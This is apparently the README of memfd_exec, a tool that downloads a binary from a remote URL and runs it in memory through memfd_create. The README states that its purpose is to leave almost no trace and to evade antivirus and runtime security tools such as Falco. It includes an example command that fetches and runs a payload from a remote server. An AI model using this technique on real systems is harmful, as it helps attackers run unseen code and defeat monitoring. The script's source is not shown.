# memfd_exec
Retrieve binary payload from a remote url and execute it in-memory using memfd

## Why in-memory execution ?

- No trace (almost ..)
- Evades detection by AVs and runtime security tools like [Falco]([url](https://github.com/falcosecurity/falco)).

## How does it work?

It uses `memfdd_create` syscall which:

> creates an anonymous file and returns a file
       descriptor that refers to it.  The file behaves like a regular
       file, and so can be modified, truncated, memory-mapped, and so
       on.  However, unlike a regular file, it lives in RAM and has a
       volatile backing storage.  Once all references to the file are
       dropped, it is automatically released.  Anonymous memory is used
       for all backing pages of the file.  Therefore, files created by
       memfd_create() have the same semantics as other anonymous memory
       allocations such as those allocated using mmap(2) with the
       MAP_ANONYMOUS flag.

- https://man7.org/linux/man-pages/man2/memfd_create.2.html

## Usage

```
usage: memfd_exec.py [-h] [--exec_args EXEC_ARGS [EXEC_ARGS ...]] url

positional arguments:
  url                   URL to the payload server

optional arguments:
  -h, --help            show this help message and exit
  --exec_args EXEC_ARGS [EXEC_ARGS ...]
                        Arguments to be passed to memfd executable
```

## Example

Serve the payload on a remote server:

```
python3 -m http.server --directory /usr/bin/
```

Execute the payload with:

```
python3 memfd_exec.py http://remote_endpoint:8000/touch --exec_args test_file
```

```
ls -s test_file
0 test_file
```
